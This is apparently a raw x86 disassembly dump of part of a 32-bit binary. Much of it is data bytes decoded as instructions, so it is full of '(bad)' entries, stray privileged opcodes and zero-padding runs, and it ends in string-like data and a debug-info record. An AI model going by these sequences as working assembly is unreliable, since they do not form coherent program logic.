  433432:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  433439:	mov    esi,DWORD PTR [edx-0x4]
  43343c:	add    bh,cl
  43343e:	dec    ebp
  43343f:	mov    dh,0x8b
  433441:	add    esi,DWORD PTR [ebx]
  433443:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  433449:	add    BYTE PTR [eax],al
  43344b:	mov    eax,ecx
  43344d:	loopne 0x43349c
  43344f:	add    BYTE PTR [ebx-0x757bcc39],cl
  433455:	dec    ebx
  433456:	or     eax,0x8b7232
  43345b:	in     al,0xc1
  43345d:	or     DWORD PTR [ebp-0x31],ecx
  433460:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  433467:	xor    dh,BYTE PTR [edx-0x75]
  43346a:	add    al,dh
  43346c:	enter  0x4f09,0xcf
  433470:	inc    ebp
  433471:	mov    WORD PTR [ebx-0x75cdccb5],cs
  433477:	or     al,BYTE PTR ds:0xe4728b
  43347d:	or     DWORD PTR [ebp-0x31],ecx
  433480:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433487:	cmp    dh,BYTE PTR [edx+0xf]
  43348a:	add    bl,dl
  43348c:	rol    DWORD PTR [eax],0x4d
  43348f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433495:	(bad)  
  433496:	or     eax,0x4b7284
  43349b:	xor    al,cl
  43349d:	mov    ecx,DWORD PTR [ebp-0x20]
  4334a0:	mov    ecx,DWORD PTR [ecx]
  4334a2:	xor    ecx,edi
  4334a4:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  4334ab:	xor    cl,al
  4334ad:	mov    ecx,DWORD PTR [edi]
  4334af:	fadd   QWORD PTR [ebp+0x9]
  4334b2:	call   0xffd02f86
  4334b7:	dec    ebx
  4334b8:	dec    ebp
  4334b9:	xor    bh,BYTE PTR [ebx]
  4334bb:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4334bf:	loopne 0x4334bd
  4334c1:	or     edi,eax
  4334c3:	iret   
  4334c4:	ret    
  4334c5:	mov    WORD PTR [ebp+0x4f],es
  4334c8:	mov    esi,DWORD PTR [edx]
  4334ca:	call   0x8452fc09
  4334cf:	(bad)  
  4334d0:	fwait
  4334d1:	add    BYTE PTR [edx],dh
  4334d3:	mov    esi,DWORD PTR [ebx]
  4334d5:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4334db:	test   BYTE PTR [ebx],dh
  4334dd:	dec    ebx
  4334de:	add    esi,DWORD PTR [edx]
  4334e0:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4334e6:	dec    edi
  4334e8:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  4334ef:	xor    al,BYTE PTR [ebx]
  4334f1:	mov    edi,DWORD PTR [ebx]
  4334f3:	in     al,0x75
  4334f5:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4334fb:	dec    ebx
  4334fc:	xor    esi,DWORD PTR [edx]
  4334fe:	lea    ecx,[edx]
  433500:	or     BYTE PTR [ebx+0x900f072],cl
  433506:	ja     0x4334d7
  433508:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43350f:	cmp    ch,al
  433511:	jne    0x433506
  433513:	mov    edi,edi
  433515:	fadd   QWORD PTR [ebp+0x0]
  433518:	mov    eax,edi
  43351a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  433521:	mov    edx,DWORD PTR [ebx]
  433523:	in     al,0x45
  433525:	or     DWORD PTR [ebx],esi
  433527:	iret   
  433528:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  43352f:	xor    dl,BYTE PTR [eax-0x75]
  433532:	sbb    al,0xe0
  433534:	dec    DWORD PTR [ecx]
  433536:	mov    ecx,edi
  433538:	in     al,dx
  433539:	mov    eax,es
  43353b:	dec    ebx
  43353c:	mov    DWORD PTR [edx],esi
  43353e:	fmul   QWORD PTR [edx]
  433540:	jne    0x4334cd
  433542:	(bad)  
  433543:	(bad)  
  433545:	or     DWORD PTR [ebp-0x31],eax
  433548:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  43354f:	cmp    bh,bh
  433551:	jne    0x433598
  433553:	lea    ecx,[ebx-0x38372750]
  433559:	inc    ebx
  43355b:	mov    eax,ecx
  43355d:	mov    eax,0xa00c111
  433562:	jne    0x4335a9
  433564:	mov    esi,DWORD PTR [ebx]
  433566:	test   al,0x3
  433568:	inc    ebp
  433569:	mov    DWORD PTR [eax-0xc],edx
  43356c:	loop   0x4335b3
  43356e:	push   DWORD PTR [ebx]
  433570:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  433576:	add    DWORD PTR [eax],eax
  433578:	mov    eax,edi
  43357a:	lods   al,BYTE PTR ds:[esi]
  43357b:	dec    ebp
  43357c:	inc    ebp
  43357d:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433583:	retf   
  433584:	mov    edx,ecx
  433586:	adc    al,0x84
  433588:	(bad)  
  433589:	std    
  43358a:	ret    
  43358b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433591:	hlt    
  433592:	rol    edi,0x82
  433595:	ret    
  433596:	cld    
  433597:	enter  0x11ff,0x45
  43359b:	inc    ebp
  43359c:	pop    edi
  43359d:	mov    ebx,DWORD PTR [ebx+0x14]
  4335a0:	ret    0xc7
  4335a3:	test   BYTE PTR [ebx+0x4532519b],cl
  4335a9:	jmp    0x433536
  4335ab:	push   0x8
  4335ad:	call   DWORD PTR [esi]
  4335af:	in     al,dx
  4335b0:	add    BYTE PTR [ebp+0x1],0x50
  4335b4:	add    bh,ah
  4335b6:	add    bh,bh
  4335b8:	icebp  
  4335b9:	mov    ecx,DWORD PTR [eax]
  4335bb:	cld    
  4335bc:	pop    es
  4335bd:	dec    ebp
  4335be:	shl    DWORD PTR [ebx],0x72
  4335c1:	add    eax,DWORD PTR [eax]
  4335c3:	cmp    edx,ecx
  4335c5:	je     0x4335d7
  4335c7:	mov    esi,DWORD PTR [ebp-0x4]
  4335ca:	inc    edi
  4335cc:	or     al,0xc3
  4335ce:	jmp    FWORD PTR [edx-0x18]
  4335d1:	(bad)  
  4335d2:	sti    
  4335d3:	cwde   
  4335d4:	(bad)  
  4335d5:	call   0xffa12ee0
  4335da:	or     al,0x45
  4335dc:	push   ebp
  4335dd:	sub    esp,0x18
  4335e0:	push   ebx
  4335e1:	inc    ebp
  4335e2:	mov    edi,edi
  4335e4:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4335eb:	test   al,0x54
  4335ed:	inc    ebp
  4335ee:	push   ecx
  4335ef:	push   eax
  4335f0:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4335f6:	add    ah,bh
  4335f8:	(bad)  
  4335f9:	dec    ebp
  4335fa:	add    DWORD PTR [ebx],esi
  4335fc:	inc    ebp
  4335fd:	add    ecx,DWORD PTR [ebx+0x74943b]
  433603:	push   0xffffff8b
  433605:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43360b:	add    eax,DWORD PTR [ecx]
  43360d:	or     BYTE PTR [eax],al
  43360f:	call   0xff852e14
  433614:	mov    eax,DWORD PTR [ebp+0x14]
  433617:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43361d:	inc    ebp
  43361e:	dec    ecx
  43361f:	add    ebp,DWORD PTR [edx+0x14]
  433622:	push   0x8b3045
  433627:	call   0x33ad839c
  43362c:	inc    DWORD PTR [ebx]
  43362e:	mov    DWORD PTR [edi],ecx
  433630:	mov    eax,ecx
  433632:	or     BYTE PTR [ebp-0x3d],cl
  433635:	cmp    eax,edi
  433637:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  43363c:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433642:	adc    al,0xc9
  433644:	inc    ebp
  433645:	adc    BYTE PTR [eax+0x55],dl
  433648:	jne    0x433636
  43364a:	call   0xff5435da
  43364f:	dec    ebp
  433650:	inc    ebp
  433651:	mov    ecx,DWORD PTR [ebx+0x390338b]
  433657:	add    BYTE PTR [ebx],bh
  433659:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  43365d:	push   esp
  43365e:	or     al,0x51
  433660:	dec    ebp
  433661:	xor    DWORD PTR [ebx],0xf32039b
  433667:	cmp    eax,DWORD PTR [ebp+0x74]
  43366a:	mov    edi,edi
  43366c:	pop    edi
  43366d:	adc    BYTE PTR [ebx+0x75],bl
  433670:	ret    0x50
  433673:	mov    edx,DWORD PTR ss:[edi-0x7d]
  433677:	(bad)  
  433678:	clc    
  433679:	mov    esp,ebp
  43367b:	pop    ecx
  43367c:	mov    ecx,0xf80085c2
  433681:	mov    ecx,DWORD PTR [ecx+edx*2]
  433684:	push   esi
  433685:	push   esi
  433686:	(bad)  
  433687:	lock add DWORD PTR [ebp+0x44],eax
  43368b:	mov    edx,DWORD PTR [eax]
  43368d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433691:	or     BYTE PTR [edi+eax*1+0x51],dl
  433695:	ret    
  433696:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43369c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4336a2:	or     al,0x80
  4336a4:	jge    0x4336a7
  4336a6:	mov    DWORD PTR [eax],eax
  4336a8:	and    al,0x8
  4336aa:	cmp    DWORD PTR [ebp+0x10],eax
  4336ad:	mov    edx,DWORD PTR [esi]
  4336af:	xchg   esp,eax
  4336b0:	dec    esp
  4336b1:	add    BYTE PTR [eax],dl
  4336b3:	mov    ecx,edx
  4336b5:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4336b9:	dec    ebp
  4336ba:	into   
  4336bb:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4336c1:	mov    edx,DWORD PTR [eax+0x14]
  4336c4:	das    
  4336c5:	add    al,0x45
  4336c7:	add    BYTE PTR [ebp+0x0],dh
  4336ca:	mov    edi,edi
  4336cc:	and    al,0x50
  4336ce:	mov    eax,DWORD PTR [eax]
  4336d0:	and    al,0xd1
  4336d2:	xor    eax,DWORD PTR [esi]
  4336d4:	lea    eax,[ebp+0x8]
  4336d7:	xor    esi,DWORD PTR [edx+0x3]
  4336da:	add    BYTE PTR [ecx+0x4510fc44],cl
  4336e0:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4336e6:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4336f0:	cmp    al,0xff
  4336f2:	pushf  
  4336f3:	mov    edi,edi
  4336f5:	or     BYTE PTR [esi+ecx*1],cl
  4336f8:	jne    0x4336bd
  4336fa:	call   0xc36c6
  4336ff:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433703:	mov    ebx,DWORD PTR [eax]
  433705:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433709:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433711:	pop    esi
  433712:	and    al,0xc9
  433714:	and    al,0x10
  433716:	call   DWORD PTR [ebp-0x73]
  433719:	in     al,dx
  43371a:	jmp    esp
  43371c:	je     0x4336a1
  43371e:	call   DWORD PTR [eax]
  433720:	and    al,0x31
  433722:	call   0xffcd35c3
  433727:	and    al,0x44
  433729:	push   edi
  43372a:	or     al,0x41
  43372c:	pop    esi
  43372d:	mov    ebp,esp
  43372f:	and    al,0xc2
  433731:	mov    eax,DWORD PTR [eax]
  433733:	and    al,0x85
  433735:	mov    edx,0x733080e
  43373a:	jne    0x433736
  43373c:	test   DWORD PTR [ebx+0x3083275],ebx
  433742:	dec    DWORD PTR [ecx-0x74dbdb15]
  433748:	sbb    BYTE PTR [esp+edx*1],cl
  43374b:	jl     0x43374c
  43374d:	adc    al,0x24
  43374f:	dec    ebp
  433750:	mov    esi,DWORD PTR [ebp+0xc]
  433753:	mov    ecx,DWORD PTR [eax]
  433755:	and    al,0x39
  433757:	xor    ebx,DWORD PTR [ebx+ecx*4]
  43375a:	or     BYTE PTR [eax+edx*1],ah
  43375d:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  433764:	clc    
  433765:	jmp    0x433703
  433767:	adc    al,bh
  433769:	inc    esp
  43376a:	je     0x4337b8
  43376c:	and    al,0xc2
  43376e:	je     0x43370b
  433770:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  433776:	dec    DWORD PTR [ecx+0x235fbf08]
  43377c:	sbb    al,0x10
  43377e:	add    BYTE PTR [esi+edi*1+0x10],cl
  433782:	add    BYTE PTR [ebx+0xb],dh
  433785:	adc    BYTE PTR [eax],al
  433787:	mov    WORD PTR ds:0x3d450010,?
  43378d:	adc    BYTE PTR [eax],al
  43378f:	add    DWORD PTR [eax+edx*1],esp
  433792:	add    BYTE PTR [edx+0x6],cl
  433795:	adc    BYTE PTR [eax],al
  433797:	sub    dx,WORD PTR [eax]
  43379a:	add    bh,dl
  43379c:	imul   edx,DWORD PTR [eax],0x10302300
  4337a2:	add    BYTE PTR [esi+0x7b001077],dl
  4337a8:	aaa    
  4337a9:	inc    ebx
  4337aa:	add    BYTE PTR [edi+0x37],bh
  4337ad:	inc    ebx
  4337ae:	add    BYTE PTR [ebx-0x78ffbcc9],al
  4337b4:	aaa    
  4337b5:	inc    ebx
  4337b6:	add    BYTE PTR [ebx-0x70ffbcc9],cl
  4337bc:	aaa    
  4337bd:	inc    ebx
  4337be:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337c4:	aaa    
  4337c5:	inc    ebx
  4337c6:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [ebx-0x5fffbcc9],ah
  4337d4:	adc    DWORD PTR [eax],edx
  4337d6:	add    BYTE PTR [ecx],cl
  4337d8:	jo     0x4337ea
  4337da:	add    BYTE PTR ds:0xd7001027,ch
  4337e0:	pop    eax
  4337e1:	adc    BYTE PTR [eax],al
  4337e3:	push   es
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [esi+0x33001031],ah
  4337ec:	ins    BYTE PTR es:[edi],dx
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jb     0x433830
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	shl    DWORD PTR [edi],cl
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    dh,cl
  433814:	jge    0x433826
  433816:	add    BYTE PTR [esi-0x3dffef8e],dl
  43381c:	or     dl,BYTE PTR [eax]
  43381e:	add    dh,bl
  433820:	sub    dl,BYTE PTR [eax]
  433822:	add    BYTE PTR [edx],bl
  433824:	ins    BYTE PTR es:[edi],dx
  433825:	adc    BYTE PTR [eax],al
  433827:	addr16 jno 0x43383a
  43382a:	add    BYTE PTR [ebp+0x3d],ch
  43382d:	adc    BYTE PTR [eax],al
  43382f:	lds    esp,FWORD PTR [eax+0x10]
  433832:	add    BYTE PTR [ebx],dl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	cmp    al,0x14
  433855:	adc    BYTE PTR [eax],al
  433857:	clc    
  433858:	cmp    dl,BYTE PTR [eax]
  43385a:	add    BYTE PTR [ecx],ah
  43385c:	pop    ds
  43385d:	adc    BYTE PTR [eax],al
  43385f:	mov    edi,0x6001073
  433864:	adc    al,0x10
  433866:	add    BYTE PTR [ecx+0x34],bh
  433869:	adc    BYTE PTR [eax],al
  43386b:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  43386f:	shl    DWORD PTR [edx+0x10],1
  433872:	add    BYTE PTR [ebx+0x38],dl
  433875:	inc    ebx
  433876:	add    BYTE PTR [edi+0x38],dl
  433879:	inc    ebx
  43387a:	add    BYTE PTR [ebx+0x38],bl
  43387d:	inc    ebx
  43387e:	add    BYTE PTR [edi+0x38],bl
  433881:	inc    ebx
  433882:	add    BYTE PTR [ebx+0x38],ah
  433885:	inc    ebx
  433886:	add    BYTE PTR [edi+0x38],ah
  433889:	inc    ebx
  43388a:	add    BYTE PTR [ebx+0x38],ch
  43388d:	inc    ebx
  43388e:	add    BYTE PTR [edi+0x38],ch
  433891:	inc    ebx
  433892:	add    BYTE PTR [ebp+0x14],al
  433895:	adc    BYTE PTR [eax],al
  433897:	fwait
  433898:	pop    ds
  433899:	adc    BYTE PTR [eax],al
  43389b:	jnp    0x4338c0
  43389d:	adc    BYTE PTR [eax],al
  43389f:	pop    esi
  4338a0:	adc    BYTE PTR cs:[eax],al
  4338a3:	popf   
  4338a4:	jno    0x4338b6
  4338a6:	add    ah,bl
  4338a8:	inc    ebp
  4338a9:	adc    BYTE PTR [eax],al
  4338ab:	sbb    edx,DWORD PTR [edx+0x10]
  4338ae:	add    BYTE PTR [edx-0x6cffefd7],bl
  4338b4:	cmp    BYTE PTR [ebx+0x0],al
  4338b7:	xchg   edi,eax
  4338b8:	cmp    BYTE PTR [ebx+0x0],al
  4338bb:	fwait
  4338bc:	cmp    BYTE PTR [ebx+0x0],al
  4338bf:	lahf   
  4338c0:	cmp    BYTE PTR [ebx+0x0],al
  4338c3:	mov    ds:0xa7004338,eax
  4338c8:	cmp    BYTE PTR [ebx+0x0],al
  4338cb:	stos   DWORD PTR es:[edi],eax
  4338cc:	cmp    BYTE PTR [ebx+0x0],al
  4338cf:	scas   eax,DWORD PTR es:[edi]
  4338d0:	cmp    BYTE PTR [ebx+0x0],al
  4338d3:	push   esp
  4338d4:	xor    al,0x4b
  4338d6:	aaa    
  4338d7:	pop    edi
  4338d8:	inc    edx
  4338d9:	dec    ebx
  4338da:	xor    DWORD PTR [ecx],edi
  4338dc:	push   edi
  4338dd:	add    BYTE PTR [ecx+0x39],cl
  4338e0:	xor    al,0x5f
  4338e2:	pop    ecx
  4338e3:	inc    edi
  4338e4:	push   edx
  4338e5:	pop    edi
  4338e6:	dec    edx
  4338e7:	xor    al,BYTE PTR [edx+0x30]
  4338ea:	push   ebx
  4338eb:	add    BYTE PTR [ecx+0x4a],cl
  4338ee:	cmp    BYTE PTR [edi+0x38],bl
  4338f1:	xor    al,0x43
  4338f3:	xor    bl,BYTE PTR [eax+0x36]
  4338f6:	pop    edi
  4338f7:	inc    ebx
  4338f8:	add    BYTE PTR [edx+0x33],cl
  4338fb:	dec    ebp
  4338fc:	cmp    BYTE PTR [edi+0x53],bl
  4338ff:	xor    DWORD PTR [eax],edi
  433901:	pop    edx
  433902:	pop    edi
  433903:	xor    BYTE PTR [edx+0x52],cl
  433906:	inc    ecx
  433907:	add    BYTE PTR [edx+0x42],al
  43390a:	inc    ebp
  43390b:	pop    edi
  43390c:	cmp    DWORD PTR [eax],edi
  43390e:	push   ebp
  43390f:	inc    edx
  433910:	xor    eax,0x5244505f
  433915:	xor    BYTE PTR [eax],al
  433917:	inc    edx
  433918:	inc    esp
  433919:	inc    edx
  43391a:	cmp    DWORD PTR [edi+0x52],ebx
  43391d:	dec    esp
  43391e:	inc    ebp
  43391f:	add    BYTE PTR [ebx+0x37],dl
  433922:	push   esp
  433923:	xor    BYTE PTR [edi+0x55],bl
  433926:	push   ebx
  433927:	aaa    
  433928:	dec    ebp
  433929:	pop    edi
  43392a:	xor    ecx,DWORD PTR [edx+0x4e]
  43392d:	dec    ebx
  43392e:	add    BYTE PTR [edx+0x47],cl
  433931:	inc    edi
  433932:	xor    eax,0x534e5f32
  433937:	push   esp
  433938:	pop    edi
  433939:	push   esp
  43393a:	inc    edx
  43393b:	add    BYTE PTR [ebx+0x4d],al
  43393e:	xor    BYTE PTR [edi+0x47],bl
  433941:	cmp    DWORD PTR [ecx+0x5f],ebx
  433944:	push   eax
  433945:	push   ecx
  433946:	push   ecx
  433947:	pop    edi
  433948:	inc    ebx
  433949:	push   edi
  43394a:	push   esi
  43394b:	add    BYTE PTR [ecx+0x57],cl
  43394e:	inc    ebp
  43394f:	pop    edi
  433950:	pop    ecx
  433951:	push   edx
  433952:	inc    edx
  433953:	pop    edi
  433954:	inc    edi
  433955:	add    BYTE PTR [ebx+0x51],dl
  433958:	cmp    DWORD PTR ds:0x4d305f33,esi
  43395e:	inc    edi
  43395f:	xor    edx,DWORD PTR [edx+0x34]
  433962:	pop    edi
  433963:	pop    edx
  433964:	cmp    BYTE PTR [eax],al
  433966:	inc    edi
  433967:	xor    esi,DWORD PTR ds:0x5451585f
  43396d:	dec    esp
  43396e:	add    BYTE PTR [edi+esi*1+0x34],cl
  433972:	pop    edi
  433973:	cmp    BYTE PTR [edi+0x49],dl
  433976:	xor    eax,0x5700505f
  43397b:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  43397f:	dec    esi
  433980:	dec    edx
  433981:	cmp    BYTE PTR [eax],al
  433983:	pop    edx
  433984:	dec    ebx
  433985:	xor    eax,0x4f5f3131
  43398a:	xor    dh,BYTE PTR [ecx]
  43398c:	pop    edi
  43398d:	inc    ebp
  43398e:	push   esp
  43398f:	inc    esp
  433990:	inc    ebp
  433991:	add    BYTE PTR [edi+0x55],dl
  433994:	cmp    DWORD PTR [edi+0x5a],ebx
  433997:	push   edx
  433998:	inc    edi
  433999:	xor    DWORD PTR [ebp+0x0],ecx
  43399c:	pop    edx
  43399d:	dec    ecx
  43399e:	dec    ebp
  43399f:	ss pop edi
  4339a1:	pop    edx
  4339a2:	push   edx
  4339a3:	cmp    BYTE PTR [esi+0x30],dl
  4339a6:	pop    edi
  4339a7:	push   ecx
  4339a8:	dec    esi
  4339a9:	add    BYTE PTR [ebx+0x32],dl
  4339ac:	inc    ebx
  4339ad:	cmp    BYTE PTR [edi+0x52],bl
  4339b0:	dec    ecx
  4339b1:	xor    BYTE PTR [eax],al
  4339b3:	inc    edi
  4339b4:	xor    eax,0x314f5f4b
  4339b9:	xor    DWORD PTR [edi+0x38],ebx
  4339bc:	push   ebp
  4339bd:	add    BYTE PTR [edi+0x4b],al
  4339c0:	xor    bl,BYTE PTR [edi+0x43]
  4339c3:	push   ebp
  4339c4:	cmp    DWORD PTR [ebp+0x4b],ecx
  4339c7:	ss pop edi
  4339c9:	pop    edx
  4339ca:	push   edi
  4339cb:	inc    esp
  4339cc:	xor    BYTE PTR [eax],al
  4339ce:	dec    ecx
  4339cf:	inc    edi
  4339d0:	xor    eax,0x3058555f
  4339d5:	dec    ebx
  4339d6:	pop    edi
  4339d7:	push   edi
  4339d8:	add    BYTE PTR [eax+0x0],bl
  4339db:	inc    edi
  4339dc:	add    BYTE PTR [edx+0x0],al
  4339df:	pop    edi
  4339e0:	add    BYTE PTR [ebx],dh
  4339e2:	add    BYTE PTR [eax],bh
  4339e4:	add    BYTE PTR [ebx+0x0],cl
  4339e7:	xor    eax,0x33003500
  4339ec:	add    BYTE PTR [eax],dh
  4339ee:	add    BYTE PTR [edi+0x0],bl
  4339f1:	push   esp
  4339f2:	add    BYTE PTR [ebp+0x0],cl
  4339f5:	xor    BYTE PTR [eax],al
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	inc    esi
  4339fa:	add    BYTE PTR [eax+0x0],bl
  4339fd:	xor    BYTE PTR [eax],al
  4339ff:	pop    edi
  433a00:	add    BYTE PTR [ecx],dh
  433a02:	add    BYTE PTR [ebx+0x0],al
  433a05:	xor    eax,0x5f003100
  433a0a:	add    BYTE PTR [ecx+0x0],al
  433a0d:	xor    eax,DWORD PTR [eax]
  433a0f:	add    BYTE PTR [eax],al
  433a11:	push   ebx
  433a12:	add    BYTE PTR [ebx+0x0],dl
  433a15:	dec    eax
  433a16:	add    BYTE PTR [edi+0x0],bl
  433a19:	push   esp
  433a1a:	add    BYTE PTR [ebx+0x0],al
  433a1d:	push   ebx
  433a1e:	add    BYTE PTR [edx+0x0],dl
  433a21:	pop    edi
  433a22:	add    BYTE PTR [ecx+0x0],dl
  433a25:	dec    edi
  433a26:	add    BYTE PTR [edi+0x0],al
  433a29:	push   ecx
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	pop    ecx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],cl
  433a33:	dec    edi
  433a34:	add    BYTE PTR [ebp+0x0],dl
  433a37:	cmp    DWORD PTR [eax],eax
  433a39:	pop    edi
  433a3a:	add    BYTE PTR [edx],dh
  433a3c:	add    BYTE PTR [eax+eax*1+0x32],al
  433a40:	add    BYTE PTR ds:0x47005f00,dh
  433a46:	add    BYTE PTR ds:0x48000000,dh
  433a4c:	add    BYTE PTR [edx+0x0],cl
  433a4f:	push   eax
  433a50:	add    BYTE PTR [edi+0x0],bl
  433a53:	cmp    BYTE PTR [eax],al
  433a55:	add    BYTE PTR ss:0x55004100,dh
  433a5c:	add    BYTE PTR [edi+0x0],bl
  433a5f:	push   edx
  433a60:	add    BYTE PTR [edi],dh
  433a62:	add    BYTE PTR [ecx+0x0],cl
  433a65:	add    BYTE PTR [eax],al
  433a67:	inc    esp
  433a68:	add    BYTE PTR [ecx+0x0],dl
  433a6b:	inc    edx
  433a6c:	add    BYTE PTR [edi+0x0],bl
  433a6f:	push   ecx
  433a70:	add    BYTE PTR [ecx+0x0],bl
  433a73:	dec    edi
  433a74:	add    BYTE PTR [eax+0x0],dl
  433a77:	add    BYTE PTR [eax],al
  433a79:	dec    edx
  433a7a:	add    BYTE PTR [ecx+0x0],dl
  433a7d:	inc    esp
  433a7e:	add    BYTE PTR [edi+0x0],bl
  433a81:	dec    edx
  433a82:	add    BYTE PTR [eax],dh
  433a84:	add    BYTE PTR [ecx],dh
  433a86:	add    BYTE PTR [ebx+0x0],dl
  433a89:	push   ecx
  433a8a:	add    BYTE PTR [ecx],dh
  433a8c:	add    BYTE PTR [edi+0x0],bl
  433a8f:	push   edi
  433a90:	add    BYTE PTR [eax],al
  433a92:	add    BYTE PTR [ebx+0x0],cl
  433a95:	pop    edx
  433a96:	add    BYTE PTR [esi],dh
  433a98:	add    BYTE PTR [edi+0x0],bl
  433a9b:	inc    ebx
  433a9c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433aa0:	add    BYTE PTR [edi+0x0],bl
  433aa3:	push   edi
  433aa4:	add    BYTE PTR [ebx],dh
  433aa6:	add    BYTE PTR [esi+0x0],cl
  433aa9:	push   ebp
  433aaa:	add    BYTE PTR [edi+0x0],bl
  433aad:	dec    edx
  433aae:	add    BYTE PTR [eax],al
  433ab0:	add    BYTE PTR [edi+0x0],dl
  433ab3:	aaa    
  433ab4:	add    BYTE PTR [eax],bh
  433ab6:	add    BYTE PTR [edi+0x0],bl
  433ab9:	pop    eax
  433aba:	add    BYTE PTR [edi+0x0],cl
  433abd:	inc    edi
  433abe:	add    BYTE PTR [edi+0x0],bl
  433ac1:	xor    al,0x0
  433ac3:	push   eax
  433ac4:	add    BYTE PTR [ecx+0x0],cl
  433ac7:	push   ebp
  433ac8:	add    BYTE PTR [eax],al
  433aca:	add    BYTE PTR [edi+0x0],dl
  433acd:	push   esp
  433ace:	add    BYTE PTR [ebx+0x0],cl
  433ad1:	add    BYTE PTR [eax],al
  433ad3:	add    BYTE PTR [edx+0x53],dl
  433ad6:	inc    esp
  433ad7:	push   ebx
  433ad8:	out    0x82,eax
  433ada:	sub    BYTE PTR [ebp+0x74],dh
  433add:	in     al,0xfc
  433adf:	dec    edx
  433ae0:	test   DWORD PTR [ecx-0x1be55978],esi
  433ae6:	loop   0x433aa9
  433ae8:	sbb    eax,DWORD PTR [eax]
  433aea:	add    BYTE PTR [eax],al
  433aec:	push   esp
  433aed:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433af1:	addr16 push edi
  433af3:	bound  bx,DWORD PTR [edx+0x45]
  433af7:	outs   dx,BYTE PTR ds:[esi]
  433af8:	pop    esp
  433af9:	je     0x433b6e
  433afb:	ja     0x433b3e
  433afd:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433b05:	js     0x433b76
  433b07:	jp     0x433b78
  433b09:	jns    0x433b6f
  433b0b:	jp     0x433b75
  433b0d:	je     0x433b73
  433b0f:	jp     0x433b73
  433b11:	cs jo  0x433b78
  433b14:	bound  eax,QWORD PTR [eax]
	...
